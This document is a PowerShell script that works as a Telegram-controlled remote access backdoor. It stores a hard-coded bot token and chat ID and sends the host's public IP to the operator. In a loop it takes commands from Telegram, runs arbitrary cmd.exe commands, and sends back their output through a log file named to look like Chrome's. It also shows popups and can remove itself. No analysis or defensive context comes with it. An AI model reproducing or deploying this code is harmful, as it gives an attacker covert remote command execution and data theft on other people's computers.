$token = '6699820895:AAFTWerNbIafDtEzdVQ6UY2h2vW3xkPazkQ'
$cId = '6368103544'
$timeout = 1

$URL_get = "https://api.telegram.org/bot$token/getUpdates"
$URL_send = "https://api.telegram.org/bot$token/sendMessage"

$config = "C:\Users\$($env:USERNAME)\wconfig.txt"
$log = "C:\Users\$($env:USERNAME)\chrome_lastlog.txt"

$fc = Test-Path $config
$fl = Test-Path $log
$PCID = $null

if($fc) {
    	Write-Host "Config file exists."
        $PCID = Get-Content -Path $config
} else {
    Write-Host "Config file doesnt exist. Creating a new one."
    New-Item -Path $config -ItemType File
        $PCID = Get-Random -Maximum 999999999
    Set-Content -Path $config -Value $PCID
    
}

#if($fl) {
#    Write-Host "Temporary log file exists"
#
#} else {
#    Write-Host "Temporary log file exists doesnt exist. Creating a new one."
#    New-Item -Path $log -ItemType File
#    Set-Content -Path $log -Value empty
#}

Write-Host "ID: $($PCID)"


function getUpdates($URL) {
    $json = Invoke-RestMethod -Uri $URL
    $data = $json.result | Select-Object -Last 1

    $text = $null
    $callback_data = $null


    if ($data.message) {
        $chat_id = $data.message.chat.id
        $text = $data.message.text
        $f_name = $data.message.chat.first_name
        $l_name = $data.message.chat.last_name
        $type = $data.message.chat.type
        $username = $data.message.chat.username

    }

    $ht = @{}
    $ht["chat_id"] = $chat_id
    $ht["text"] = $text
    $ht["f_name"] = $f_name
    $ht["l_name"] = $l_name
    $ht["username"] = $username
    $ht["callback_data"] = $callback_data
 
    
     try
    {
        Invoke-RestMethod "$($URL)?offset=$($($data.update_id)+1)" -Method Get | Out-Null
    }
    catch
    {
       Write-Error $_.Exception.ToString()
       return "error"
    }
    return $ht
}

function sendMessagePr($text) {
    try {
        Invoke-RestMethod -Uri "$($URL_send)?chat_id=$($cId)&text=$($text)" 
    }
    catch {
        Write-Error $_.Exception.ToString()
    }
}

function popup($title, $body) {
    [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
    [System.Windows.Forms.MessageBox]::Show("$($title)","$($body)")
}

$IP = Invoke-RestMethod -Uri 'https://ifconfig.me/ip'
sendMessagePr("Logged as $($PCID), IP: $($IP)")

while($true) {
    $msg = getUpdates($URL_get)
    $getcId = $msg["chat_id"]
    $Text= $msg["text"]

    if($null -eq $getcId) {

    }
    elseif($cId -eq $getcId) {
    
        if($Text.StartsWith("ping $($PCID)")) {
            $IP = Invoke-RestMethod -Uri 'https://ifconfig.me/ip'

            sendMessagePr("pong $($PCID), IP: $($IP)")
        }

        if($Text.StartsWith("changeID $($PCID)")) {

            $a = $Text
            $b = $a.Substring(10 + $PCID.Length)
            $a = $b
            $PCID = $a

            Set-Content -Path $config -Value $a

            sendMessagePr("Changed ID to $($a)")
            Write-Host "New ID: $($PCID)"


        }
        if($Text.StartsWith("virtualcmd $($PCID)")) {

            $a = $Text
            $a = $a.Substring(12 + $PCID.Length)

            Write-Host "Executing $($a) on $($PCID)"

            cmd.exe /c $a | Out-File $log
            
            $output = Get-Content -Path $log

            sendMessagePr("Command Executed. Output: $($output)")

            Start-Sleep -Seconds $timeout

            Remove-item -Path $log


        }
        if($Text.StartsWith("popup $($PCID)")) {

            $a = $Text
            $a = $a.Substring(7 + $PCID.Length)
            $a = $a.Split('|')

            popup $a[0] $a[1]

           

        }
        if($Text.StartsWith("manage $($PCID)")) {

            $a = $Text
            $a = $a.Substring(8 + $PCID.Length)
           if($a -eq 'stop') {
            sendMessagePr('Stopping process.')
            exit 
           } elseif($a -eq 'uninstall') {
            sendMessagePr('Uninstalling')
            Remove-Item $PSCommandPath -Force
           } else {
            sendMessagePr("Wrong Syntax. Please try again")
           }
        }
    }

    
    Start-Sleep -Seconds $timeout
}